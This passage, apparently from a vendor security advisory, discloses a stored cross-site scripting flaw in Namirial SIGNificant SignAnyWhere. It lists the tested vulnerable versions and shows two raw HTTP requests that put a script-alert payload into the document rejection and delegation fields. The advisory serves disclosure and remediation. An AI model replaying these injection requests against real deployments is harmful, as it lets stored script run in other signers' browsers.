Business recommendation:
------------------------
Update to the latest version of Namirial SIGNificant SignAnyWhere.

An in-depth security analysis performed by security professionals is highly
advised, as the software may be affected from further security issues.


Vulnerability overview/description:
-----------------------------------
1. Stored Cross-Site Scripting (Authenticated access)
Due to the lack of input validation and output sanitization, an attacker, who was
granted access to a document that is provided by a customer via email, can inject
malicious JavaScript code, which will be executed in the browser of a user.


Proof of concept:
-----------------
1. Stored Cross-Site Scripting (Authenticated access)
The following method can be used to exploit the stored cross-site scripting
vulnerability.

Click the link, which was sent to you via email for signing the document.

There are 2 possibilities to inject a cross-site scripting payload:
 1: Reject the document.
 2: Delegate the document.

The request below shows that an attacker can inject a malicious payload
via the rejection functionality (the RejectMessage key is affected).

POST /SawViewer/SignAnywhereServices.asmx/RejectWorkstep HTTP/1.1
Host: $host
      ---snip---
{"basicParameters":{"WorkstepId":"<removed>", "GeolocationLongitude":0,"GeolocationLatitude":0,
"GeolocationErrorState":"NOT_USED","Accuracy":-1,"UsedLanguage":"de","SupportId":"<removed>"},
"rejectConfiguration":"{\"RejectMessage\":\"<script>alert(location.origin)</script>\",\"Type\":\"Reject\"}"}

Using the same process an attacker can also inject a malicious payload
via the delegation functionality (the delegationReason key is affected).

POST /SawViewer/SignAnywhereServices.asmx/RejectWorkstep HTTP/1.1
Host: $host
      ---snip---

{"basicParameters":{"WorkstepId":"<removed>", "GeolocationLongitude":0,"GeolocationLatitude":0,
"GeolocationErrorState":"GEOLOC_NO_TIMEOUT","Accuracy":-1,"UsedLanguage":"de","SupportId":"<removed>"},
"rejectConfiguration":"{\"RejectMessage\":\"",\"Type\":\"Delegation\",\"AdditionalInformation\":\"
{\\\"firstName\\\":\\\"name\\\",\\\"lastName\\\":\\\"name\\\",\\\"email\\\":\\\"delegation mail\\\",
\\\"phoneNumber\\\":\\\"phone number\\\",\\\"delegationReason\\\":\\\"<script>alert(location.origin)</script>\\\"}\"}"}

The injected cross-site scripting payload is stored within the application and
upon opening the document the payload will be automatically executed.


Vulnerable / tested versions:
-----------------------------
The following versions of the software have been tested and found to be vulnerable:
* Namirial SIGNificant SignAnyWhere version v6.10.60.25434 (SSP v4.22.60.25434)
* Namirial SIGNificant SignAnyWhere version v6.10.100.25817 (SSP v4.22.100.25817)

Previous and newer versions may also be affected.
